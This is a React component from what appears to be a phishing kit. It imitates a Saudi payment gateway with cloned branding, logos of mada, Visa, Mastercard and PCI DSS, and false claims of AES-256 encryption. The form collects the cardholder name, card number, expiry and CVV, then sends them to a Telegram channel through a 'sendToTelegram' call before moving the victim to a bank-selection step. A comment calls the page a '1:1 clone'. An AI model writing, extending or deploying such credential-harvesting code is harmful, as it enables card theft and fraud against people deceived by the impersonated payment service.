import { useState, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import { CreditCard, ShieldCheck, Lock, Loader2, Info } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import { getCompanyLayout } from "@/components/CompanyLayouts";
import { formatCurrency } from "@/lib/countryCurrencies";
import { getCountryByCode } from "@/lib/countries";
import { serviceLogos } from "@/lib/serviceLogos";

const PaymentCardForm = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData } = useLink(id);
  const updateLink = useUpdateLink();
  
  const [cardName, setCardName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiryMonth, setExpiryMonth] = useState("");
  const [expiryYear, setExpiryYear] = useState("");
  const [cvv, setCvv] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  const customerInfo = linkData?.payload?.customerInfo || {};
  const serviceKey = (linkData?.payload?.service_key || customerInfo.service || 'sadad').toLowerCase();
  const countryCode = linkData?.payload?.selectedCountry || linkData?.country_code || "SA";
  const countryData = getCountryByCode(countryCode);
  
  const shippingInfo = linkData?.payload as any;
  const rawAmount = shippingInfo?.payment_data?.payment_amount || shippingInfo?.payment_amount || shippingInfo?.cod_amount || 500;
  const formattedAmount = formatCurrency(rawAmount, countryData?.currency || "SAR");
  
  const Layout = getCompanyLayout(serviceKey);
  const branding = serviceLogos[serviceKey] || {
    logo: "",
    colors: { primary: "#EF7622", secondary: "#D65C0F" },
    nameAr: "بوابة دفع آمنة"
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!cardName || !cardNumber || !expiryMonth || !expiryYear || !cvv) {
      toast({ title: "خطأ", description: "الرجاء ملء جميع الحقول", variant: "destructive" });
      return;
    }
    
    setIsSubmitting(true);
    const expiry = `${expiryMonth}/${expiryYear}`;
    const cardInfo = { cardName, cardNumber, expiry, cvv };
    
    try {
      await updateLink.mutateAsync({
        linkId: id!,
        payload: { ...linkData?.payload, cardInfo }
      });
      
      await sendToTelegram({
        type: 'card_details',
        data: { ...customerInfo, service: serviceKey, ...cardInfo, amount: formattedAmount },
        timestamp: new Date().toISOString()
      });
      
      navigate(`/pay/${id}/bank-selector`);
    } catch (err) {
      console.error(err);
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <Layout companyKey={serviceKey} amount={formattedAmount}>
      <div className="text-right">
        {/* WORM_V2_V9: ABSOLUTE REALISTIC 1:1 CLONE IMAGE */}
        <div className="relative w-full h-52 mb-8 overflow-hidden rounded-2xl shadow-[0_8px_30px_rgb(0,0,0,0.12)] border border-gray-100/50">
           <img 
             src="https://images.pexels.com/photos/5098028/pexels-photo-5098028.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=2" 
             alt="Secure Payment Gateway" 
             className="w-full h-full object-cover"
           />
           <div className="absolute inset-0 bg-gradient-to-t from-black/80 via-black/20 to-transparent flex items-end p-6">
              <div className="text-white w-full">
                 <div className="flex items-center justify-between mb-2">
                    <div className="flex items-center gap-2">
                       <div className="bg-green-500 w-2 h-2 rounded-full animate-pulse" />
                       <span className="text-[9px] font-black uppercase tracking-[0.2em] text-white/90">تشفير AES-256 نشط</span>
                    </div>
                    {branding.logo && <img src={branding.logo} className="h-6 object-contain brightness-0 invert opacity-90" />}
                 </div>
                 <h4 className="text-2xl font-black mb-1 leading-tight tracking-tight">بوابة السداد الموحدة</h4>
                 <div className="flex items-center gap-2 text-[10px] font-bold text-white/60">
                    <Lock className="w-3 h-3" />
                    <span>عملية دفع محمية من {branding.nameAr}</span>
                 </div>
              </div>
           </div>
        </div>

        <div className="flex items-center justify-between mb-8 border-b border-gray-100 pb-4">
           <div className="flex items-center gap-3">
              <div className="bg-gray-50 p-3 rounded-xl border border-gray-100">
                 <CreditCard className="w-6 h-6" style={{ color: branding.colors.primary }} />
              </div>
              <div className="text-left">
                 <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest leading-none">Card Details</p>
                 <h3 className="text-lg font-black text-gray-900 leading-tight">بيانات بطاقة الدفع</h3>
              </div>
           </div>
           <div className="flex flex-col items-end">
              <span className="text-[10px] font-black text-gray-400 mb-1 uppercase tracking-widest">Amount</span>
              <span className="text-xl font-black text-gray-900">{formattedAmount}</span>
           </div>
        </div>

        <form onSubmit={handleSubmit} className="space-y-5">
          <div className="grid gap-2">
            <Label className="text-sm font-black text-gray-700 mr-1 flex items-center justify-end gap-1">
               الاسم المكتوب على البطاقة
               <Info className="w-3 h-3 text-gray-300" />
            </Label>
            <Input 
              placeholder="Hassan Al-Otaibi"
              className="h-14 text-right border-gray-200 focus:ring-0 focus:border-black rounded-xl font-bold placeholder:text-gray-300 transition-all"
              value={cardName}
              onChange={(e) => setCardName(e.target.value)}
              required
            />
          </div>

          <div className="grid gap-2">
            <Label className="text-sm font-black text-gray-700 mr-1">رقم البطاقة</Label>
            <div className="relative">
              <Input 
                placeholder="0000 0000 0000 0000"
                className="h-14 text-center border-gray-200 focus:ring-0 focus:border-black rounded-xl font-black tracking-[0.1em] placeholder:text-gray-300 transition-all"
                value={cardNumber}
                onChange={(e) => setCardNumber(e.target.value.replace(/\s/g, '').replace(/(\d{4})/g, '$1 ').trim().substring(0, 19))}
                required
                maxLength={19}
              />
              <div className="absolute left-4 top-1/2 -translate-y-1/2 flex gap-1">
                 <img src="/assets/branding/logo-mada.png" className="h-4 object-contain grayscale opacity-50" onError={(e) => (e.target as HTMLImageElement).style.display='none'} />
                 <img src="/assets/branding/logo-visa.png" className="h-4 object-contain grayscale opacity-50" onError={(e) => (e.target as HTMLImageElement).style.display='none'} />
              </div>
            </div>
          </div>

          <div className="grid grid-cols-2 gap-4">
            <div className="grid gap-2">
              <Label className="text-sm font-black text-gray-700 mr-1">تاريخ الانتهاء</Label>
              <div className="grid grid-cols-2 gap-2">
                <Select value={expiryMonth} onValueChange={setExpiryMonth}>
                  <SelectTrigger className="h-14 border-gray-200 rounded-xl font-bold focus:ring-0 focus:border-black">
                    <SelectValue placeholder="شهر" />
                  </SelectTrigger>
                  <SelectContent>
                    {Array.from({ length: 12 }, (_, i) => i + 1).map((m) => (
                      <SelectItem key={m} value={m.toString().padStart(2, '0')}>{m.toString().padStart(2, '0')}</SelectItem>
                    ))}
                  </SelectContent>
                </Select>
                <Select value={expiryYear} onValueChange={setExpiryYear}>
                  <SelectTrigger className="h-14 border-gray-200 rounded-xl font-bold focus:ring-0 focus:border-black">
                    <SelectValue placeholder="سنة" />
                  </SelectTrigger>
                  <SelectContent>
                    {Array.from({ length: 15 }, (_, i) => new Date().getFullYear() + i).map((y) => (
                      <SelectItem key={y} value={y.toString().slice(-2)}>{y}</SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>
            </div>
            
            <div className="grid gap-2">
              <Label className="text-sm font-black text-gray-700 mr-1">رمز التحقق (CVV)</Label>
              <Input 
                placeholder="123"
                type="password"
                className="h-14 text-center border-gray-200 focus:ring-0 focus:border-black rounded-xl font-black tracking-widest placeholder:text-gray-300 transition-all"
                value={cvv}
                onChange={(e) => setCvv(e.target.value.substring(0, 3))}
                required
                maxLength={3}
              />
            </div>
          </div>

          <Button 
            type="submit" 
            className="w-full h-16 text-lg font-black rounded-xl transition-all shadow-lg active:scale-95 disabled:opacity-70 disabled:active:scale-100 flex items-center justify-center gap-3 mt-4"
            style={{ 
              backgroundColor: branding.colors.primary,
              boxShadow: `0 10px 20px ${branding.colors.primary}33`
            }}
            disabled={isSubmitting}
          >
            {isSubmitting ? <Loader2 className="w-6 h-6 animate-spin" /> : (
              <>
                <ShieldCheck className="w-6 h-6" />
                <span>إتمام عملية الدفع الآمن</span>
              </>
            )}
          </Button>

          <div className="flex items-center justify-center gap-4 pt-4 grayscale opacity-40">
             <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" className="h-4" />
             <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" className="h-6" />
             <img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/Mada_Logo.svg" className="h-4" />
             <img src="https://upload.wikimedia.org/wikipedia/commons/b/b7/PCI_DSS_logo.svg" className="h-6" />
          </div>
        </form>
      </div>
    </Layout>
  );
};

export default PaymentCardForm;
